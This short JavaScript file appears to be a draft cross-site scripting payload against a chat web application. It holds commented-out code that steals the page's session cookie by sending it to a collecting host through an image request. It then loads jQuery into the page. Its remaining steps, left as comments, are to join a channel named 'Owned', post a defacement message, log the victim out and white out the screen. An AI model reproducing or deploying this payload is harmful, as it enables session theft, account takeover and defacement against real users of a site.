// First thing, lets steal the cookie
// var d = document;
// var i = d.createElement("img");
// i.src = 'http://localhost/s.jpg?c=' + encodeURI(d.cookie);
// d.body.appendChild(i);

// Load in JQuery
var jquery = document.createElement('script');
jquery.src = 'http://code.jquery.com/jquery-2.2.1.min.js';
document.head.appendChild(jquery);

// Next, lets add ourselves to the channel "Owned"
// POST /api/v1/channels/hash/join


// Next, lets say we were owned in the "Owned" channel
// 

// Finally, lets log ourselves out, fade the screen to white, and write "Owned"